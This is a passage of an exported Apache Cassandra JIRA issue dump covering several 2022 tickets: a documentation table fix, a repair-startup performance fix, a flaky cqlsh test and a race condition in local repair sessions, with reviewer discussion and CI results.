;02/Mar/22 20:16;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,CASSANDRA-17130,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,frankgh,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 09 18:25:03 UTC 2022,,,,,,,All,,,,"0|z0z8ug:",9223372036854775807,,,,smiklosovic,ycai,,,Low,,5.0,,https://github.com/apache/cassandra/commit/543608ba39d5803b963d14821abe193ff0796b4f,,,,,,,,,ci build run,,,,,"04/Feb/22 01:03;frankgh;PR: https://github.com/apache/cassandra/pull/1438;;;","04/Feb/22 11:22;smiklosovic;https://ci-cassandra.apache.org/job/Cassandra-devbranch/1402/;;;","04/Feb/22 11:23;smiklosovic;[~yifanc] would you mind to review as well? This is trying to fix ""your stuff"".;;;","04/Feb/22 16:13;frankgh;CI here as well: https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17347&filter=all;;;","04/Feb/22 19:05;frankgh;CI looks green, minor the common occasional flakiness;;;","04/Feb/22 21:23;yifanc;+1

Thanks for fixing the NPE;;;","07/Feb/22 19:13;smiklosovic;+1 thanks!;;;","07/Feb/22 19:45;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17347-trunk-C63D5419-98C0-41CD-977E-D59055700079]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17347-trunk-C63D5419-98C0-41CD-977E-D59055700079]|

--edit--

I had 2 CI runs of the patch. Both produce bunch of test failures. However, they do not seem to be caused by this patch, since it only changes an internal bit inside the connectivity checker. 

So I also started a CI with just the trunk code. It showed even more failures. See [here|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=test&filter=all]. It indicates the test failures are not related with the simple change in the patch. ;;;","09/Feb/22 18:25;yifanc;Committed into trunk as [543608ba|https://github.com/apache/cassandra/commit/543608ba39d5803b963d14821abe193ff0796b4f];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Hint documentation page has a misaligned table of settings / description / default values,CASSANDRA-17346,13426517,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adhogg,adhogg,adhogg,03/Feb/22 21:18,27/May/22 19:25,13/Jul/23 08:40,04/Feb/22 13:51,3.11.12,4.0.2,4.1,4.1-alpha1,,,Documentation/Website,,,,0,,"Within the versioned documentation, the page for configuring hints contains a misaligned table of hint settings, caused the the hinted_handoff_disabled_datacenters row, which shifts all columns 1 further, mis-aligning the rest of the content and then removing the final cell. Screenshot attached of the start of the misalignment on the table.",,adhogg,mck,,,,,,,,,,,,,"AndrewHogg opened a new pull request #1436:
URL: https://github.com/apache/cassandra/pull/1436


   Fixing the misalignment within the documentation table of the hint settings.
   
   patch by Andrew Hogg; for CASSANDRA-17346


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;03/Feb/22 21:59;githubbot;600","michaelsembwever closed pull request #1436:
URL: https://github.com/apache/cassandra/pull/1436


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;04/Feb/22 13:50;githubbot;600","michaelsembwever commented on pull request #1436:
URL: https://github.com/apache/cassandra/pull/1436#issuecomment-1030002541


   Merged manually with https://github.com/apache/cassandra/commit/e4c6b8e1ed64f92ab7d6008730504a48fe9ee3c4


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;04/Feb/22 13:50;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,CASSANDRA-17442,CASSANDRA-16867,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Feb/22 21:17;adhogg;Screenshot 2022-02-03 at 21.17.38.png;https://issues.apache.org/jira/secure/attachment/13039647/Screenshot+2022-02-03+at+21.17.38.png",,,,,1.0,adhogg,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,Docs,,Fri Feb 04 13:51:17 UTC 2022,,,mck,,,,All,,,,"0|z0z8qw:",9223372036854775807,,,,mck,,,,Low,,3.11.11,,https://github.com/apache/cassandra/commit/e4c6b8e1ed64f92ab7d6008730504a48fe9ee3c4,,,,,,,,,Website was built using : ./run.sh website build -g -b cassandra:hint-docs-fix -u cassandra:/andrewhogg-cassandra and manually inspected.,,,,,"03/Feb/22 21:59;adhogg;Pull request opened : [https://github.com/apache/cassandra/pull/1436]

This change will apply to 3.11, 4.0 and trunk;;;","04/Feb/22 13:51;mck;Committed as [e4c6b8e1ed64f92ab7d6008730504a48fe9ee3c4|https://github.com/apache/cassandra/commit/e4c6b8e1ed64f92ab7d6008730504a48fe9ee3c4].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance problem for node restart with incremental range repairs,CASSANDRA-17342,13426253,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,paulchandler,paulchandler,paulchandler,02/Feb/22 18:18,27/May/22 19:25,13/Jul/23 08:40,11/Feb/22 13:17,4.0.3,4.1,4.1-alpha1,,,,Consistency/Repair,,,,0,,"There is a performance problem when restarting cassandra for clusters doing incremental repairs with range repairs. 

We have clusters with 16 vnodes per node, and are splitting each vnode into 100 ranges, this causes a node to take over 30 minutes to process the data stored in the system.repairs table before the node can restart. Even when we reduce this to 10 ranges per vnode this still takes 2 minutes to process. The cluster has 22 keyspaces and a rf of 3, this creates around 8100 records in the system.repairs table.

 

The problem seems to occur in the org.apache.cassandra.repair.consistent.RepairState class where the add method re processes the complete list, including sorting, every time a new Range is added. This leads is an exponential growth in processing time, this is demonstrated in the attached unit test.

 

I have created a change, that collects the data read in from the system.repairs table, in the org.apache.cassandra.repair.consistent.LocalSessions class, before processing it as a group at the end, this reduces the processing time to a couple of seconds even for the 100 range version.

 

This is my first attempt at changing the cassandra code, so I am in need of a mentor to help me with the process, and validate what I have done.",,brandon.williams,e.dimitrova,marcuse,mck,paulchandler,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Feb/22 21:02;paulchandler;BulkRepairStateTest.java;https://issues.apache.org/jira/secure/attachment/13039616/BulkRepairStateTest.java","02/Feb/22 18:17;paulchandler;IncrementalRepairStartupTest.java;https://issues.apache.org/jira/secure/attachment/13039611/IncrementalRepairStartupTest.java","02/Feb/22 21:02;paulchandler;LocalSessions.java;https://issues.apache.org/jira/secure/attachment/13039614/LocalSessions.java","02/Feb/22 21:02;paulchandler;RepairedState.java;https://issues.apache.org/jira/secure/attachment/13039615/RepairedState.java",,4.0,paulchandler,,,,,,,,,,,,,,Degradation -> Performance Bug/Regression,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Feb 11 13:17:44 UTC 2022,,,,,,,All,,,,"0|z0z748:",9223372036854775807,,,,brandon.williams,marcuse,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/c60ad61b3b6145af100578f2c652819f61729018,,,,,,,,,run CI,,,,,"02/Feb/22 18:40;brandon.williams;Paul, thanks for reporting this, your analysis looks solid to me.

I see your test attachment, do you also have the code changes to LocalSessions available?   Reviewing that will help determine the next steps here.

cc [~marcuse] I think this came from CASSANDRA-9143.;;;","02/Feb/22 18:51;paulchandler;Thanks Brandon, currently my change is a bit of a rough and ready hack, so I will make it more presentable and then share it ;;;","02/Feb/22 21:04;paulchandler;[~brandon.williams] These are the changes I have done:

In LocalSessions.java, I have modified the method maybeUpdateRepairedState to store the level data for later if the node is in the process of starting. I have added the method finaliseStates to process all the data at the end.

In RepairedState.java added the method finaliseInitalLevels and refactored the add method to pull out the processLevels method which will now do the processing during start up and during steady state.

I have created UnitTest BulkRepairStateTest, this is basically a copy RepairStateTest, but calling the new methods instead.

I have not done that much testing, but the command nodetool repair_admin summarize-repaired does give the same results as before.;;;","02/Feb/22 22:06;brandon.williams;Thanks, Paul.  To make this easier for collaboration, could you put this into a git repository?;;;","03/Feb/22 10:48;paulchandler;I have created a pull request here: [https://github.com/paulchandler/cassandra/pull/1/files]



This is the first time for me doing this, so not sure if I have done it correctly, if not, I welcome any guidance to improve. ;;;","03/Feb/22 12:50;brandon.williams;That's perfect.  I've moved this to Patch Available to signal it is ready to be reviewed.  Thanks Paul!;;;","03/Feb/22 13:17;marcuse;Hi, thanks fro the patch and welcome to the project

I just had a quick pass over the patch and it looks like a good approach

There are some code style issues in the patch, see https://cassandra.apache.org/_/development/index.html for information on how to set up your IDE etc

Then, I wonder if it would be better to add an {{addAll(Collection<Level> ...)}} method on {{RepairedState}} and then collect the initial Levels in a local list in LocalSessions#start() instead of using {{initialLevels}} in {{RepairedState}}?;;;","03/Feb/22 13:42;paulchandler;Thanks Marcus,

I will take a look at the style issues.

I did think about doing it as an addAll method, I can't remember what stopped me, so I will revisit it.;;;","03/Feb/22 14:32;paulchandler;If I create a Level object in the LocalSessions class, that needs to be passed to multiple RepairedState objects, one per table ( this is currently done in the maybeUpdateRepairedState method ) So if I was storing the Level object in a collection this would need to be a collection of collections, one for each table/RepairedState. Which seems to add extra complexity to the LocalSessions, when it is simpler to directly store them in the RepairedState class. 

If you think this is the right way to go, then I am happy to do that, or if there is a different way I am happy to hear it. My Java skills are rather rusty, I did send 15 years writing demand forecasting algorithms, but stopped that 10 years ago!;;;","03/Feb/22 15:17;marcuse;Tracking them in a {{Map<TableId, List<RepairedState.Level>> initialLevels = new HashMap<>();}} in the {{start()}} method is a bit clearer to me, and it avoids adding that list in RepairedState which is only used during startup;;;","04/Feb/22 11:30;paulchandler;I have updated the patch now as we discussed, hopefully I have fixed the code style issues as well, but let me know if there is anything else that needs addressing. ;;;","07/Feb/22 13:13;marcuse;thanks, that looks good - I made a few minor changes and pushed to get it tested:
https://github.com/krummas/cassandra/commits/CASSANDRA-17342
https://app.circleci.com/pipelines/github/krummas/cassandra/767/workflows/6ba0edc0-f878-48fd-8b5a-22002aab7990

Let me know what you think.

Also, do you have an email address for the Author: field?;;;","07/Feb/22 15:40;paulchandler;Hi Marcus, 
Yes those changes look good. I am not sure where I my email address goes for the Author: field ? ;;;","08/Feb/22 06:55;marcuse;It would be the git author field, to show that it is your patch. Something like [this|https://www.git-tower.com/learn/git/faq/change-author-name-email];;;","08/Feb/22 14:35;brandon.williams;Cleanups look good, the couple CI failures are known. +1;;;","10/Feb/22 15:02;paulchandler;Hi [~marcuse] I have finally fixed the email address on my commits (I've been held back by too many production issues). Not sure if that was the right thing to do now, as there are later changes in your repository.

Not sure if you were waiting for me, or what the next step is now.;;;","10/Feb/22 15:23;marcuse;looks good, I'll get this committed tomorrow, thank you!;;;","10/Feb/22 15:30;paulchandler;That is good news. Thanks for all your help with this Marcus and Brandon. The process was not a daunting as I was expecting, and hopefully I will get some time to take a look at some of the other open tickets soon.;;;","10/Feb/22 15:32;brandon.williams;That's great to hear, Paul!  I'll keep an eye out for you :);;;","11/Feb/22 13:17;marcuse;Committed to 4.0 and merged up, thanks again for the patch!

trunk tests look bad, but similar to [non-patched trunk|https://app.circleci.com/pipelines/github/krummas/cassandra/775/workflows/b0ede5ae-db7c-4a1d-b6ff-22245922bb46]

[circleci 4.0|https://app.circleci.com/pipelines/github/krummas/cassandra/770/workflows/edfe8c85-0de6-4191-b4be-e7c4cb1a4c1e]
[circleci trunk|https://app.circleci.com/pipelines/github/krummas/cassandra/769/workflows/6eea562c-0354-41e2-b253-32da2f929193];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - test_cqlsh_completion.TestCqlshCompletion,CASSANDRA-17338,13426200,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,azotcsit,brandon.williams,brandon.williams,02/Feb/22 13:25,25/Feb/22 21:29,13/Jul/23 08:40,19/Feb/22 09:43,3.0.27,3.11.13,,,,,CQL/Interpreter,,,,0,," Failed 4 times in the last 24 runs. Flakiness: 30%, Stability: 83%

A bunch of the test_completion_* tests fail occasionally with an eyebleed inducing mismatched output.",,azotcsit,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,azotcsit,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Feb 25 21:29:53 UTC 2022,,,,,,,All,,,,"0|z0z6sg:",9223372036854775807,,,,brandon.williams,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/d17b16c9b1bf3e325d415b3777c2a7bd24c764ce,,,,,,,,,The test has been fix and run 10 times locally. No documentation changes are required.,,,,,"18/Feb/22 16:34;azotcsit;I can see failures for 3.0 as well:
 * [https://ci-cassandra.apache.org/job/Cassandra-3.0-cqlsh-tests/301/#showFailuresLink]
 * [https://ci-cassandra.apache.org/job/Cassandra-3.0-cqlsh-tests/302/#showFailuresLink]
 * [https://ci-cassandra.apache.org/job/Cassandra-3.0-cqlsh-tests/306/#showFailuresLink]

Similarly to CASSANDRA-17386 the issue is reproducible locally and seems to be fixed in [https://github.com/apache/cassandra/commit/bf9a1d487b9ba469e8d740cf7d1cd419535a7e79].

I'll backport necessary changes to 3.0 branch.

 ;;;","18/Feb/22 16:43;azotcsit;The fix seems to be working locally. Kicked of CI and raised a PR.
||Item||Link||
|PR|[https://github.com/apache/cassandra/pull/1460]|
|CI|[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1432/]|;;;","18/Feb/22 17:52;brandon.williams;Nice, +1.;;;","19/Feb/22 09:43;azotcsit;Merged as [https://github.com/apache/cassandra/commit/d17b16c9b1bf3e325d415b3777c2a7bd24c764ce.] Thanks for quick review!;;;","21/Feb/22 20:47;jmckenzie;Congrats on being guinea pig #1. :)

I doubt a test fix ticket is going to give rise to any of those ""1 of 38"" failures below, but worth the basic visibility to author / reviewer.

--------------------------------------------------------

[CI Results]
Branch: trunk, build number: 968
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/968/]
JIRA: CASSANDRA-17338
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=d17b16c9b1bf3e325d415b3777c2a7bd24c764ce]
affected paths:
 * pylib/cqlshlib/test/run_cqlsh.py
 * pylib/cqlshlib/test/test_cqlsh_completion.py
 * CHANGES.txt

Build Result: UNSTABLE
Passing Tests: 43697
Failing Tests: 12
||Test|Failures|JIRA|
|org.apache.cassandra.cql3.ViewTest.testTruncateWhileBuilding|1 of 38|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*ViewTest*%22]|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSegmentFlaggingWithNonblockingOnCreation|2 of 38|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|18 of 38|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|18 of 38|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|17 of 38|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade|18 of 38|CASSANDRA-17306?|
|org.apache.cassandra.io.sstable.CQLSSTableWriterTest.testDateType-compression|1 of 38|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.KeywordTest.test[keyword ROLES isReserved false]|1 of 38|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.commitlog.BatchCommitLogTest.testBatchCLShutDownImmediately[3]-cdc|1 of 38|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|2 of 38|CASSANDRA-16677?|
|dtest-novnode.materialized_views_test.TestMaterializedViewsConsistency.test_multi_partition_consistent_reads_after_write|1 of 38|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;","21/Feb/22 21:10;azotcsit;[~jmckenzie] 

> I doubt a test fix ticket is going to give rise to any of those ""1 of 38"" failures below, but worth the basic visibility to author / reviewer.

Nice report! I feel these changes are not related to the test failures because the idea of the fix is to port some changes from 4.0 to 3.0/3.11. So nothing in 4.0/trunk has been actually changed (apart from _CHANGES.txt_ file).

Is 38 a typo? I can see 12 failures only.;;;","22/Feb/22 13:56;jmckenzie;That's ""1 failure of the last 38 runs"".

 

Maybe I should revise it to read ""1 in 38"" instead?;;;","25/Feb/22 21:29;azotcsit;No, I feel ""1 of 38"" is clear as well. I just misread your original message, sorry for confusion.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix race condition bug during local session repair,CASSANDRA-17335,13426195,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bernardo.botella,adelapena,adelapena,02/Feb/22 13:05,27/May/22 19:25,13/Jul/23 08:40,04/Mar/22 18:47,4.0.4,4.1,4.1-alpha1,,,,Test/dtest/java,,,,0,,"The in-JVM dtest {{RepairErrorsTest#testNoSuchRepairSessionAnticompaction}} seems to be flaky, as it's shown by [this repeated run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1280/workflows/8a4e04cb-64cc-46a3-9e1e-c946dfafc7fa/jobs/12114] on trunk, which hits 18 failures in 500 iterations. The config for CircleCI was generated with:
{code}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=500 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.RepairErrorsTest
{code}
This was discovered while testing CASSANDRA-16878, on [this CI run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1268/workflows/aef1c703-c816-40f8-8e07-9055027d6403/jobs/12000].

The error consists on a failed assertion when grepping the logs in search of an error message.",,adelapena,bereng,bernardo.botella,e.dimitrova,yifanc,,,,,,,,,,"bereng commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r814612818



##########
File path: CHANGES.txt
##########
@@ -1,3 +1,5 @@
+Fix race condition bug during local session repair (CASSANDRA-17335)

Review comment:
       This entry should go nder the 4.0.4 section




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;25/Feb/22 09:34;githubbot;600","bbotella commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r816903902



##########
File path: CHANGES.txt
##########
@@ -1,3 +1,5 @@
+Fix race condition bug during local session repair (CASSANDRA-17335)

Review comment:
       Moving it




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Mar/22 15:55;githubbot;600","bbotella commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r816915343



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       What do you suggest that should be compared inside the `setStateAndSave()` method? Would it be a fallback of the `Preconditions.checkArgument` checking the `canTransitionTo` of a given state, so instead of failing the method execution we just swallow it silently and log it?
   
   If that's the suggestion, I see that the method is being used in several other places:
   * handleFinalizeProposeMessage
   * handleFinalizeCommitMessage
   * handleStatusResponse
   * cancelSession
   * maybeSetRepairing
   
   And not all of them have follow a strict compare and set pattern (some of them just have a set).
   
   Having said that, if we wanted to overload setStateAndSave, my opinion is that it would be a slightly out of the scope change that may somehow force us to add fallbacks where we have currently none (those methods which only have a set). 
   
   I think it may require a bit of a broader discussion to basically answer this question: Are we sure we want to avoid failing fast on those cases? I am definitely open to debate.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;01/Mar/22 16:06;githubbot;600","bereng commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r817385385



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       The suggestion is to add to:
   -  `setStateAndSave()` and argument `currentState` that can be null. If null the method behaves as it does now. If a state is provided it will then compare `state.getState()` to `currentState` and fail or return false if they don't match. Rename the method to `compareAndSaveState`i.e.
   - Add a new `setStateAndSave`method without the `currentState` argument for all calls that don't need the compare behavior.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;02/Mar/22 06:32;githubbot;600","bereng commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r817385385



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       The suggestion is to add to:
   -  `setStateAndSave()` and argument `currentState` that can be null. If null the method behaves as it does now. If a state is provided it will then compare `state.getState()` to `currentState` and fail or return false if they don't match. Rename the method to `compareAndSaveState`i.e.
   - Add a new `setStateAndSave`method without the `currentState` argument for all calls that don't need the compare behavior. It will just call `compareAndSaveState`with null.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;02/Mar/22 06:33;githubbot;600","bereng commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r817385385



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       The suggestion is to add to:
   -  `setStateAndSave()` and argument `currentState` that can be null. If null the method behaves as it does now. If a state is provided it will then compare `state.getState()` to `currentState` and fail or return false if they don't match. Rename the method to `compareAndSaveState`i.e.
   - Add a new `setStateAndSave`method without the `currentState` argument for all calls that don't need the compare behavior. It will just call `compareAndSaveState`with null.
   
   No behavioral changes are introduced. 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;02/Mar/22 06:35;githubbot;600","yifan-c commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r817957193



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       @bereng , understanding the motivation to generalize the CAS-like operation, I'd like to point out the logic here is mostly, if _not_ in some state, then set and save. There is also a call-site that compares with 2 states. 
   ```java
           if (response.state == FINALIZED || response.state == FAILED)
           {
               setStateAndSave(session, response.state);
               logger.info(""Unfinished local incremental repair session {} set to state {}"", sessionID, response.state);
           }
   ```




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;02/Mar/22 18:00;githubbot;600","bereng commented on a change in pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468#discussion_r818351074



##########
File path: src/java/org/apache/cassandra/repair/consistent/LocalSessions.java
##########
@@ -862,6 +860,25 @@ public void onFailure(Throwable t)
         }, MoreExecutors.directExecutor());
     }
 
+    /**
+     * Checks for the session state, and sets it to prepared unless it is on a failed state.
+     * Making the checks inside a synchronized block to prevent the session state from
+     * being changed between the read and the update.
+     *
+     * @param session The local session to be set to prepared.
+     * @return true if the session is prepared, false if not, i.e. session failed
+     */
+    private boolean prepareSessionExceptFailed(LocalSession session) {

Review comment:
       Well if you guys don't like it I'm fine with it. It's just how I would do it but again, personal opinion, no big thing. +1




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

